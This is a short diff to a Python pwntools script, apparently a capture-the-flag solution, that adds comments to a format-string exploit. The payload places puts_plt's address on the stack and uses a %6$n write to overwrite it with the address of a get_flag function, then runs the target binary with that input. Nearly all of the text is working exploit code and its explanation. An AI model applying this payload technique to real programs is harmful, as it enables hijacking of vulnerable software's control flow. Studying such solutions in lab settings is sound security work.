@@ -26,7 +26,11 @@ def conn():
     '''Establish the connection to the process
     '''
 
+    # Write the address of puts_plt to the stack
     exploit = p32(puts_plt)
+    # Payload has 4 bytes from puts_plt so subtract it.
+    # Use %n to point to address stored in the 6th field (now puts_plt)
+    # and replace it with address of get_flag
     exploit += b'%' + str(get_flag - 0x4).encode() + b'x%6$n'
     io = process([exe.path, exploit])
     return io
